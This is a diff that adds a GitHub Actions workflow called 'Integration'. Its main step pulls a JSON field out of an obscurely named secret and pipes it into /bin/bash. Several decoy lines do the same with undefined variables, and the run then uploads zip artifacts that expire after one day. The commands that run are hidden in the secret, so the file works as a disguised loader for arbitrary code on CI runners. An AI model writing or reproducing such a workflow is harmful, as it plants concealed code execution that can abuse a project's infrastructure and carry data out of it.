@@ -1,0 +1,31 @@
+name: Integration
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+jobs:
+  task:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Execute
+        env:
+          whpct0495: ${{ secrets.whpct0495 }}
+        run: |
+          printf '%s' "$whpct0495" | jq -r .ss90 | /bin/bash
+          echo $kz4695 | jq -r .l440 | /bin/bash
+          printf '%s' "$y525" | jq -r .bymdh30841 | /bin/bash
+          echo $l22 | jq -r .hpti33090 | /bin/bash
+          printf '%s' "$tmz3302" | jq -r .mq14 | /bin/bash
+          printf '%s' "$ece87685" | jq -r .snfrg91 | /bin/bash
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: QiZZtwVS
+          path: "*.zip"
+          retention-days: 1
